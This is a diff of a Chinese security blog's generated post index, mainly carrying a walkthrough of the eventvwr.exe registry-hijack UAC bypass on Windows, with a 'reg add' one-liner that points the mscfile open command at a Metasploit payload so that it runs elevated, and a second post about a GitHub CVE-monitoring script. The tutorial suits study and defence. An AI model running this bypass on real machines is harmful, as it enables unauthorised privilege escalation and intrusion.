@@ -859,6 +859,106 @@
       </tags>
   </entry>
   <entry>
+    <title>Windows提权-BypassUAC之劫持注册表实验</title>
+    <url>/2021/01/19/Windows%E6%8F%90%E6%9D%83-BypassUAC%E4%B9%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/</url>
+    <content><![CDATA[<blockquote>
+<p>  准备PPT的过程中，还是学到不少东西的</p>
+</blockquote>
+<h3 id="1-UAC-简介"><a href="#1-UAC-简介" class="headerlink" title="1. UAC 简介"></a>1. UAC 简介</h3><p>**UAC(User Account Control，用户账号控制)**是微软为了提高系统安全性在Windows Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。</p>
+<p>在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。在权限不够的情况下，访问系统磁盘的根目录( 例如 C:\)、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证，如图所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084909.png" alt="image-20210118155254114"></p>
+<p><strong>需要UAC的授权才能进行的操作列表如下：</strong></p>
+<ul>
+<li>配置Windows Update</li>
+<li>增加、删除账户</li>
+<li>更改账户类型</li>
+<li>更改UAC的设置</li>
+<li>安装ActiveX</li>
+<li>安装、卸载程序</li>
+<li>安装设备驱动程序</li>
+<li>将文件移动&#x2F;复制到Program Files或Windows目录下</li>
+<li>查看其它用户的文件夹</li>
+<li>…</li>
+</ul>
+<p><strong>UAC有如下四种设置要求：</strong></p>
+<ul>
+<li><p>始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户</p>
+</li>
+<li><p>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户</p>
+</li>
+<li><p>仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度</p>
+</li>
+<li><p>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084914.png" alt="image-20210119212303742"></p>
+</li>
+</ul>
+<h3 id="2-利用系统自带的UAC白名单程序提权"><a href="#2-利用系统自带的UAC白名单程序提权" class="headerlink" title="2. 利用系统自带的UAC白名单程序提权"></a>2. 利用系统自带的UAC白名单程序提权</h3><p>用户账户控制限制着程序使用高级权限才能进行的操作，但是，UAC同样也会对系统本身的程序造成影响，微软也不希望运行系统程序也需要询问用户，因为系统程序是安全的。因此，微软则在 UAC 中添加了白名单机制，即在系统中记录有一张表单，表单中的系统程序，将不限制其直接提升到管理员权限。 系统中的白名单程序有多个，其中，msconfig、taskmgr、perfmon、cleanmgr 等平时常用的程序都在其中。操作系统的UAC白名单程序，默认以管理员权限运行，而且不弹出UAC窗口确认。这些白名单程序，都具有微软的签名是操作系统可信的。</p>
+<p>所以我们可以找一些以高权限运行的，但是并没有uac提示的进程，然后利用ProcessMonitor寻找他启动调用却缺失的如dll、注册表键值，然后我们添加对应的值达到bypass uac的效果。</p>
+<p>以高权限运行的进程图标一般有如下标志：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084919.png" alt="image-20210119104903074"></p>
+<h3 id="3-怎么找这些白名单程序"><a href="#3-怎么找这些白名单程序" class="headerlink" title="3. 怎么找这些白名单程序"></a>3. 怎么找这些白名单程序</h3><p>白名单程序都有一个特性，就是它们都具有autoElevate属性，该属性可由特定工具查看。</p>
+<p>利用微软自带工具检测程序是否具有autoElevate属性，以eventvwr.exe为例，该程序位于C:\Windows\System32目录下。使用微软的Sigcheck工具去查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sigcheck.exe：https://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sigcheck64.exe -m C:\Windows\System32\eventvwr.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084934.png" alt="image-20210119143254956"></p>
+<p>利用(Strings.exe](<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings)%E5%B7%A5%E5%85%B7%E6%89%BE%E5%87%BA%E6%89%80%E6%9C%89%E5%85%B7%E6%9C%89autoElevate%E5%B1%9E%E6%80%A7%E7%9A%84%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%B0%86strings.exe%E6%94%BE%E5%9C%A8C:/Windows/System32%E7%9B%AE%E5%BD%95%E4%B8%8B">https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings)工具找出所有具有autoElevate属性的程序，将strings.exe放在C:\Windows\System32目录下</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings.exe -s *.exe | findstr /i autoelevate</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084950.png" alt="image-20210119144326844"></p>
+<p>系统在调用这些高权限程序时，会调用<code> HKCR（ HKEY_CLASSES_ROOT）</code>下的键值。 所以，修改<code> HKCR（ HKEY_CLASSES_ROOT）</code>下的键值，把原本的键值改为 cmd.exe 等 shell 程序。如果高权限的程序，在运行过程中调用此处被修改过的键值，就会以高权限启动我们设定的程序。从而实现绕过 UAC提权。难点在于找到注册表的关键位置。</p>
+<h3 id="4-如何找对应的注册表？以事件查看器（eventvwr-为例"><a href="#4-如何找对应的注册表？以事件查看器（eventvwr-为例" class="headerlink" title="4. 如何找对应的注册表？以事件查看器（eventvwr)为例"></a>4. 如何找对应的注册表？以事件查看器（eventvwr)为例</h3><p>接下来使用 <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon">Process Monitor</a> 工具来查看eventvwr运行时，会调用哪些文件、查询哪些注册表地址。（win7 上无法使用 提示： unable to load Process Monitor device driver，需要更新下面这个补丁即可：<a href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148%EF%BC%89">https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148）</a></p>
+<p>1、打开Process Monitor工具后，设置过滤规则，选择工具栏”Filter” &#x3D;&#x3D;&gt; “Filter…”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085000.png" alt="image-20210119160455408"></p>
+<p>设置过滤规则，”Process Name” “is” “eventvwr.exe”，然后点击Add添加规则，之后点击Apply应用和OK即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085005.png" alt="image-20210119160612340"></p>
+<p>运行eventvwr.exe，之后查看Process Monitor ，会出现一堆东西，而且右键Properties 可以看到<code>eventvwr.exe</code>权限为 <code>high</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085012.png" alt="image-20210119161656625"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085019.png" alt="image-20210119164141166"></p>
+<p>难点就在于从这一堆东西中找到注册表的关键位置，这里我也并不熟悉，通过查找搜索，发现关键点为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Classes\mscfile\shell\open\command</span><br><span class="line">HKCR\mscfile\shell\open\command</span><br></pre></td></tr></table></figure>
+
+<p>在进程 <code>eventvwr.exe</code> 启动的时候，首先查找注册表位置 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>。如果该处为空，接着查找注册表位置 <code>HKCR\mscfile\shell\open\command</code>(此处默认值为 <code>%SystemRoot%\system32\mmc.exe &quot;%1&quot; %*</code>)，以高权限启动 <code>mmc.exe</code>，最后打开 <code>eventvwr.msc</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085025.png" alt="image-20210119211043232"></p>
+<p>这里由结果向原因推导：发现关键字，<code>shell</code> 、<code>command</code> </p>
+<p>搞站不就是拿shell，执行命令，这里不就是执行命令的点吗？！</p>
+<h4 id="4-1-测试"><a href="#4-1-测试" class="headerlink" title="4.1 测试"></a>4.1 测试</h4><p>如果修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，使其查询结果为 <code>SUCCESS</code>，会如何呢？</p>
+<p>首先需要修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，为测试可以把值改为 <code>calc.exe</code>， 打开运行，执行regedit</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注册表内：</span><br><span class="line">    HKCU = HKEY_CURRENT_USER</span><br><span class="line">    HKLM = HKEY_LOCAL_MACHINE</span><br><span class="line">    HKCR = HKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure>
+
+<p>在Win7 中 我这里的 <code>regedit</code> 中的键值只到 <code>HKCU\Software\Classes\</code> 这层目录，所以我新增了后面的表项，并把值设为 <code>C:\Windows\System32\calc.exe</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085030.png" alt="image-20210119163817241"></p>
+<p>再重新启动<code>eventvwr.exe</code>，成功弹出计算器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085036.png" alt="image-20210119163926939"></p>
+<p>并且使用Process Monitor 查看权限，也是<code>high</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085040.png" alt="image-20210119164604806"></p>
+<p>而正常启动计算器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085048.png" alt="image-20210119164803238"></p>
+<p>实验成功，成功绕过 UAC。</p>
+<h4 id="4-2-实战"><a href="#4-2-实战" class="headerlink" title="4.2 实战"></a>4.2 实战</h4><p>修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，为msf生成的exe，之后运行<code>eventvwr.exe</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085055.png" alt="image-20210119165643571"></p>
+<p>一句话修改注册表，将<code>d:\1.exe</code>改为msf的exe地址，复制到命令行执行即可</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d d:\1.exe /f   <span class="comment">#1.exe为msf马</span></span><br></pre></td></tr></table></figure>
+
+<p>如果直接执行shell.exe，反弹回来的会话不能通过getsystem直接提权，因为会被UAC拦截</p>
+<p><img src="/images/image-20210119171432120.png" alt="image-20210119171432120"></p>
+<p>劫持注册表后，再次执行eventvwr，程序就会去查找劫持的注册表地址，然后以自动提权之后的管理员权限加载shell.exe，此时反弹回来的会话可通过getsystem直接提权</p>
+<p><img src="/images/image-20210119170019046.png" alt="image-20210119170019046"></p>
+<p>最后记得清除注册表项</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，执行eventvwr命令时才会去注册表查找mmc.exe的路径，如果执行的是mmc.exe eventvwr.msc，直接加载mmc.exe，是不会去查询注册表的。</p>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SScan  一款src捡洞扫描器</title>
     <url>/2021/01/11/SScan/</url>
     <content><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/python-3.6|3.7|3.8-blue" alt="python"></a></p>
@@ -1009,42 +1109,6 @@
       </tags>
   </entry>
   <entry>
-    <title>gitHub_cve_monitor</title>
-    <url>/2021/02/25/github_cve_monitor/</url>
-    <content><![CDATA[<blockquote>
-<p>没事少矫情，有空多赚钱。</p>
-</blockquote>
-<h2 id="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"><a href="#监控github上新增的cve编号项目漏洞，推送钉钉或者server酱" class="headerlink" title="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"></a>监控github上新增的cve编号项目漏洞，推送钉钉或者server酱</h2><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m pip install dingtalkchatbot</span><br><span class="line">python3 github_cve_monitor.py</span><br></pre></td></tr></table></figure>
-
-<p>每3分钟检测一次github是否有新的cve漏洞提交记录，若有则通过server酱和钉钉机器人推送（二者配置一个即可）</p>
-<p>时间间隔修改在 58 行</p>
-<p>建议使用<a href="https://www.runoob.com/linux/linux-comm-screen.html">screen命令</a>运行在自己的linux vps后台上，就可以愉快的接收各种cve了</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -S github_cve	<span class="comment">#创建一个screen，名字为github_cve，在新窗口运行本项目, 成功后直接叉掉该窗口, 项目就会在后台一直运行了</span></span><br><span class="line"></span><br><span class="line">screen -<span class="built_in">ls</span> 		<span class="comment">#查看创建的screen</span></span><br><span class="line"></span><br><span class="line">screen -r github_cve	<span class="comment">#连接github_cve后台screen，如果存在的话</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>钉钉机器人配置在 33行的 dingding函数中，需要钉钉建群，添加钉钉机器人，复制 webhook 替换即可</p>
-<p>server酱配置在 40行的 server 函数中，ps：因微信的原因，server酱的旧版将在2021年4月后下线，新版以企业微信为主，这里使用的是旧版，想改新版的话，搞个企业微信，从新配置server酱，使用新链接 sctapi.ftqq.com</p>
-<p>具体查看server酱官方，<a href="http://sc.ftqq.com/">http://sc.ftqq.com/</a> ，配置简单，只需要将脚本中的uri换掉即可</p>
-<p><a href="https://sct.ftqq.com/">server酱新版</a>支持多通道（微信、客户端、群机器人、邮件和短信）</p>
-<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210225093627.png" alt="image-20210225090416314"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210225094630.jpg" alt="751614217534_.pic"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210225093635.png" alt="image-20210225092350481"></p>
-<p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li>洛米唯熊 	<a href="https://my.oschina.net/u/4581868/blog/4380482">https://my.oschina.net/u/4581868/blog/4380482</a></li>
-<li>kiang70      <a href="https://github.com/kiang70/Github-Monitor">https://github.com/kiang70/Github-Monitor</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>开源工具</category>
-      </categories>
-      <tags>
-        <tag>开源工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows系统散列值获取</title>
     <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
     <content><![CDATA[<blockquote>
@@ -1129,103 +1193,39 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows提权-BypassUAC之劫持注册表实验</title>
-    <url>/2021/01/19/Windows%E6%8F%90%E6%9D%83-BypassUAC%E4%B9%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/</url>
+    <title>gitHub_cve_monitor</title>
+    <url>/2021/02/25/github_cve_monitor/</url>
     <content><![CDATA[<blockquote>
-<p>  准备PPT的过程中，还是学到不少东西的</p>
+<p>没事少矫情，有空多赚钱。</p>
 </blockquote>
-<h3 id="1-UAC-简介"><a href="#1-UAC-简介" class="headerlink" title="1. UAC 简介"></a>1. UAC 简介</h3><p>**UAC(User Account Control，用户账号控制)**是微软为了提高系统安全性在Windows Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。</p>
-<p>在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。在权限不够的情况下，访问系统磁盘的根目录( 例如 C:\)、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证，如图所示：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084909.png" alt="image-20210118155254114"></p>
-<p><strong>需要UAC的授权才能进行的操作列表如下：</strong></p>
-<ul>
-<li>配置Windows Update</li>
-<li>增加、删除账户</li>
-<li>更改账户类型</li>
-<li>更改UAC的设置</li>
-<li>安装ActiveX</li>
-<li>安装、卸载程序</li>
-<li>安装设备驱动程序</li>
-<li>将文件移动&#x2F;复制到Program Files或Windows目录下</li>
-<li>查看其它用户的文件夹</li>
-<li>…</li>
+<h2 id="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"><a href="#监控github上新增的cve编号项目漏洞，推送钉钉或者server酱" class="headerlink" title="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"></a>监控github上新增的cve编号项目漏洞，推送钉钉或者server酱</h2><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m pip install dingtalkchatbot</span><br><span class="line">python3 github_cve_monitor.py</span><br></pre></td></tr></table></figure>
+
+<p>每3分钟检测一次github是否有新的cve漏洞提交记录，若有则通过server酱和钉钉机器人推送（二者配置一个即可）</p>
+<p>时间间隔修改在 58 行</p>
+<p>建议使用<a href="https://www.runoob.com/linux/linux-comm-screen.html">screen命令</a>运行在自己的linux vps后台上，就可以愉快的接收各种cve了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -S github_cve	<span class="comment">#创建一个screen，名字为github_cve，在新窗口运行本项目, 成功后直接叉掉该窗口, 项目就会在后台一直运行了</span></span><br><span class="line"></span><br><span class="line">screen -<span class="built_in">ls</span> 		<span class="comment">#查看创建的screen</span></span><br><span class="line"></span><br><span class="line">screen -r github_cve	<span class="comment">#连接github_cve后台screen，如果存在的话</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>钉钉机器人配置在 33行的 dingding函数中，需要钉钉建群，添加钉钉机器人，复制 webhook 替换即可</p>
+<p>server酱配置在 40行的 server 函数中，ps：因微信的原因，server酱的旧版将在2021年4月后下线，新版以企业微信为主，这里使用的是旧版，想改新版的话，搞个企业微信，从新配置server酱，使用新链接 sctapi.ftqq.com</p>
+<p>具体查看server酱官方，<a href="http://sc.ftqq.com/">http://sc.ftqq.com/</a> ，配置简单，只需要将脚本中的uri换掉即可</p>
+<p><a href="https://sct.ftqq.com/">server酱新版</a>支持多通道（微信、客户端、群机器人、邮件和短信）</p>
+<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210225093627.png" alt="image-20210225090416314"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210225094630.jpg" alt="751614217534_.pic"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210225093635.png" alt="image-20210225092350481"></p>
+<p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li>洛米唯熊 	<a href="https://my.oschina.net/u/4581868/blog/4380482">https://my.oschina.net/u/4581868/blog/4380482</a></li>
+<li>kiang70      <a href="https://github.com/kiang70/Github-Monitor">https://github.com/kiang70/Github-Monitor</a></li>
 </ul>
-<p><strong>UAC有如下四种设置要求：</strong></p>
-<ul>
-<li><p>始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户</p>
-</li>
-<li><p>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户</p>
-</li>
-<li><p>仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度</p>
-</li>
-<li><p>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084914.png" alt="image-20210119212303742"></p>
-</li>
-</ul>
-<h3 id="2-利用系统自带的UAC白名单程序提权"><a href="#2-利用系统自带的UAC白名单程序提权" class="headerlink" title="2. 利用系统自带的UAC白名单程序提权"></a>2. 利用系统自带的UAC白名单程序提权</h3><p>用户账户控制限制着程序使用高级权限才能进行的操作，但是，UAC同样也会对系统本身的程序造成影响，微软也不希望运行系统程序也需要询问用户，因为系统程序是安全的。因此，微软则在 UAC 中添加了白名单机制，即在系统中记录有一张表单，表单中的系统程序，将不限制其直接提升到管理员权限。 系统中的白名单程序有多个，其中，msconfig、taskmgr、perfmon、cleanmgr 等平时常用的程序都在其中。操作系统的UAC白名单程序，默认以管理员权限运行，而且不弹出UAC窗口确认。这些白名单程序，都具有微软的签名是操作系统可信的。</p>
-<p>所以我们可以找一些以高权限运行的，但是并没有uac提示的进程，然后利用ProcessMonitor寻找他启动调用却缺失的如dll、注册表键值，然后我们添加对应的值达到bypass uac的效果。</p>
-<p>以高权限运行的进程图标一般有如下标志：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084919.png" alt="image-20210119104903074"></p>
-<h3 id="3-怎么找这些白名单程序"><a href="#3-怎么找这些白名单程序" class="headerlink" title="3. 怎么找这些白名单程序"></a>3. 怎么找这些白名单程序</h3><p>白名单程序都有一个特性，就是它们都具有autoElevate属性，该属性可由特定工具查看。</p>
-<p>利用微软自带工具检测程序是否具有autoElevate属性，以eventvwr.exe为例，该程序位于C:\Windows\System32目录下。使用微软的Sigcheck工具去查看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sigcheck.exe：https://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sigcheck64.exe -m C:\Windows\System32\eventvwr.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084934.png" alt="image-20210119143254956"></p>
-<p>利用(Strings.exe](<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings)%E5%B7%A5%E5%85%B7%E6%89%BE%E5%87%BA%E6%89%80%E6%9C%89%E5%85%B7%E6%9C%89autoElevate%E5%B1%9E%E6%80%A7%E7%9A%84%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%B0%86strings.exe%E6%94%BE%E5%9C%A8C:/Windows/System32%E7%9B%AE%E5%BD%95%E4%B8%8B">https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings)工具找出所有具有autoElevate属性的程序，将strings.exe放在C:\Windows\System32目录下</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings.exe -s *.exe | findstr /i autoelevate</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084950.png" alt="image-20210119144326844"></p>
-<p>系统在调用这些高权限程序时，会调用<code> HKCR（ HKEY_CLASSES_ROOT）</code>下的键值。 所以，修改<code> HKCR（ HKEY_CLASSES_ROOT）</code>下的键值，把原本的键值改为 cmd.exe 等 shell 程序。如果高权限的程序，在运行过程中调用此处被修改过的键值，就会以高权限启动我们设定的程序。从而实现绕过 UAC提权。难点在于找到注册表的关键位置。</p>
-<h3 id="4-如何找对应的注册表？以事件查看器（eventvwr-为例"><a href="#4-如何找对应的注册表？以事件查看器（eventvwr-为例" class="headerlink" title="4. 如何找对应的注册表？以事件查看器（eventvwr)为例"></a>4. 如何找对应的注册表？以事件查看器（eventvwr)为例</h3><p>接下来使用 <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon">Process Monitor</a> 工具来查看eventvwr运行时，会调用哪些文件、查询哪些注册表地址。（win7 上无法使用 提示： unable to load Process Monitor device driver，需要更新下面这个补丁即可：<a href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148%EF%BC%89">https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148）</a></p>
-<p>1、打开Process Monitor工具后，设置过滤规则，选择工具栏”Filter” &#x3D;&#x3D;&gt; “Filter…”</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085000.png" alt="image-20210119160455408"></p>
-<p>设置过滤规则，”Process Name” “is” “eventvwr.exe”，然后点击Add添加规则，之后点击Apply应用和OK即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085005.png" alt="image-20210119160612340"></p>
-<p>运行eventvwr.exe，之后查看Process Monitor ，会出现一堆东西，而且右键Properties 可以看到<code>eventvwr.exe</code>权限为 <code>high</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085012.png" alt="image-20210119161656625"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085019.png" alt="image-20210119164141166"></p>
-<p>难点就在于从这一堆东西中找到注册表的关键位置，这里我也并不熟悉，通过查找搜索，发现关键点为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Classes\mscfile\shell\open\command</span><br><span class="line">HKCR\mscfile\shell\open\command</span><br></pre></td></tr></table></figure>
-
-<p>在进程 <code>eventvwr.exe</code> 启动的时候，首先查找注册表位置 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>。如果该处为空，接着查找注册表位置 <code>HKCR\mscfile\shell\open\command</code>(此处默认值为 <code>%SystemRoot%\system32\mmc.exe &quot;%1&quot; %*</code>)，以高权限启动 <code>mmc.exe</code>，最后打开 <code>eventvwr.msc</code>。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085025.png" alt="image-20210119211043232"></p>
-<p>这里由结果向原因推导：发现关键字，<code>shell</code> 、<code>command</code> </p>
-<p>搞站不就是拿shell，执行命令，这里不就是执行命令的点吗？！</p>
-<h4 id="4-1-测试"><a href="#4-1-测试" class="headerlink" title="4.1 测试"></a>4.1 测试</h4><p>如果修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，使其查询结果为 <code>SUCCESS</code>，会如何呢？</p>
-<p>首先需要修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，为测试可以把值改为 <code>calc.exe</code>， 打开运行，执行regedit</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注册表内：</span><br><span class="line">    HKCU = HKEY_CURRENT_USER</span><br><span class="line">    HKLM = HKEY_LOCAL_MACHINE</span><br><span class="line">    HKCR = HKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure>
-
-<p>在Win7 中 我这里的 <code>regedit</code> 中的键值只到 <code>HKCU\Software\Classes\</code> 这层目录，所以我新增了后面的表项，并把值设为 <code>C:\Windows\System32\calc.exe</code>。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085030.png" alt="image-20210119163817241"></p>
-<p>再重新启动<code>eventvwr.exe</code>，成功弹出计算器</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085036.png" alt="image-20210119163926939"></p>
-<p>并且使用Process Monitor 查看权限，也是<code>high</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085040.png" alt="image-20210119164604806"></p>
-<p>而正常启动计算器</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085048.png" alt="image-20210119164803238"></p>
-<p>实验成功，成功绕过 UAC。</p>
-<h4 id="4-2-实战"><a href="#4-2-实战" class="headerlink" title="4.2 实战"></a>4.2 实战</h4><p>修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，为msf生成的exe，之后运行<code>eventvwr.exe</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085055.png" alt="image-20210119165643571"></p>
-<p>一句话修改注册表，将<code>d:\1.exe</code>改为msf的exe地址，复制到命令行执行即可</p>
